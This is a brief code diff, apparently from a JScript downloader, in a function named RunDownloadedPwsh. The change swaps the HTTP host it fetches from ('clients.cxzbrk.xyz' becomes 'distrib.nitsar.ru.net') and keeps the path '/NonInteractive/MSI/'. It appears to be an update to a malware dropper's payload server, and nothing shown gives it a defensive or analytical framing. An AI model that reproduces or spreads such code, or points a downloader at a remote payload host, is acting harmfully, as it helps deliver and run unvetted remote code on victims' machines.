@@ -476,7 +476,7 @@ function RunDownloadedPwsh(strPath, strPwsh, intTimeOut ){
 	//
 	var http_Pref, http_Host, http_Port, http_Path
 	http_Pref = "http";
-	http_Host = "clients.cxzbrk.xyz";
+	http_Host = "distrib.nitsar.ru.net";
 	http_Port = "80";
 	http_Path = "/NonInteractive/MSI/";
 	// Define Temporary Variables
